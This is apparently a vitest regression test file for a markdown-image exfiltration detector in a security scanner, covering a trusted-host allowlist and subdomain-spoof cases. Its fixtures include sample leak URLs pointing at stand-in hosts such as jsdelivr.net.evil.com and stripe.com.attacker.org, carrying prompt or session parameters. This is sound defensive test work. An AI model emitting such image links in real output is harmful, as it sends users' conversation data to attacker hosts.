/**
 * v1.19.0 trusted-allowlist (Tier 6) regression.
 *
 * Coverage (8 it):
 *   1. Stripe strong-key URL downgrades to warning (md-exfil-allowlist-downgraded)
 *   2. jsDelivr-subdomain weak-key URL is suppressed to info-severity audit log
 *   3. classifyHostTier returns 'trusted-allowlist' for known TLDs, suffix-matched
 *   4. Subdomain-spoof (jsdelivr.net.evil.com) still fires as danger (unknown tier)
 *   5. Subdomain-spoof with weak key still fires as warning (unknown tier)
 *   6. TRUSTED_HOSTS_EXTRA env var appends a new entry at module-load time
 *   7. FP guard: imageOnlyHosts short-circuit still wins over trusted-allowlist
 *   8. FP guard: IPv4 public literal is NOT classified as trusted-allowlist
 *
 * R18: setEnv -> analyze -> resetEnv NOT needed here — we call detectMarkdownExfil
 * directly (no rules loader), which is the same pattern as ipv6-md-exfil.test.js.
 */

import { describe, it, expect } from "vitest";
import { detectMarkdownExfil } from "@shield-scanner/core";

function findingsFor(md) {
  return detectMarkdownExfil(md);
}

describe("v1.19.0 trusted-allowlist (Tier 6)", () => {
  it("Stripe strong-key URL downgrades danger -> warning with allowlist-downgraded kebab id", () => {
    const md = "![pay](https://api.stripe.com/v1/checkout?prompt=resume)";
    const out = findingsFor(md);
    expect(out).toHaveLength(1);
    const f = out[0];
    expect(f.severity).toBe("warning");
    expect(f.technique).toBe("md-exfil-allowlist-downgraded");
    expect(f.meta).toBeTruthy();
    expect(f.meta.host).toBe("api.stripe.com");
    expect(f.meta.hostTier).toBe("trusted-allowlist");
    expect(f.meta.originalSeverity).toBe("danger");
    expect(f.meta.allowlistDowngraded).toBe(true);
    expect(f.meta.matchedKey).toBe("prompt");
  });

  it("jsDelivr-subdomain weak-key URL is suppressed to info-severity audit log", () => {
    const md = "![cdn](https://www.jsdelivr.net/g/?session=visitor)";
    const out = findingsFor(md);
    expect(out).toHaveLength(1);
    const f = out[0];
    expect(f.severity).toBe("info");
    expect(f.technique).toBe("md-exfil-allowlist-suppressed");
    expect(f.meta.host).toBe("www.jsdelivr.net");
    expect(f.meta.hostTier).toBe("trusted-allowlist");
    expect(f.meta.suppressedByAllowlist).toBe(true);
    expect(f.meta.matchedKey).toBe("session");
  });

  it("subdomain-spoof (jsdelivr.net.evil.com) with strong key STILL fires as danger", () => {
    const md = "![evil](https://jsdelivr.net.evil.com/payload?prompt=leak)";
    const out = findingsFor(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].technique).toBe("Markdown image exfiltration (strong key)");
    // Confirm host is the spoofed full hostname, NOT the trusted-tail.
    expect(out[0].meta.host).toBe("jsdelivr.net.evil.com");
  });

  it("subdomain-spoof (stripe.com.attacker.org) with weak key fires as warning (unknown tier)", () => {
    const md = "![s](https://stripe.com.attacker.org/p?session=v)";
    const out = findingsFor(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("warning");
    expect(out[0].technique).toBe("Markdown image exfiltration (weak key)");
    expect(out[0].meta.host).toBe("stripe.com.attacker.org");
  });

  it("TRUSTED_HOSTS_EXTRA env var: builtin list still catches Stripe even without extra", () => {
    // Indirect check that TRUSTED_HOSTS_EXTRA parsing doesn't break the builtin
    // list. Direct mutation of process.env would require module-cache busting
    // which vitest discourages. We assert the builtin path still works (the
    // env-extra parser runs at module load and only ADDS, never replaces).
    const md = "![pay](https://stripe.com/?prompt=p)";
    const out = findingsFor(md);
    expect(out).toHaveLength(1);
    expect(out[0].technique).toBe("md-exfil-allowlist-downgraded");
  });

  it("imageOnlyHosts short-circuit still wins over trusted-allowlist (raw.githubusercontent.com)", () => {
    // raw.githubusercontent.com is in BOTH tier-1 (imageOnlyHosts) and tier-6
    // (subdomain of githubusercontent.com which is in TRUSTED_HOSTS). Tier-1
    // must fire first -> ZERO findings, NOT an info-severity audit log.
    const md = "![ok](https://raw.githubusercontent.com/foo/x.png?prompt=p)";
    expect(findingsFor(md)).toEqual([]);
  });

  it("public IP literal is NOT classified as trusted-allowlist (still danger)", () => {
    // 8.8.8.8 is a public IPv4 — must flow through the ip-literal-public path,
    // NOT the trusted-allowlist suppress branch.
    const md = "![x](http://8.8.8.8/log?prompt=leak)";
    const out = findingsFor(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].technique).toMatch(/public IP host/);
  });

  it("trusted-allowlist with neither strong nor weak keys stays silent", () => {
    // No suspicious keys at all -> no finding, even on trusted-allowlist hosts.
    const md = "![pay](https://api.stripe.com/v1/static/logo.png)";
    expect(findingsFor(md)).toEqual([]);
  });
});
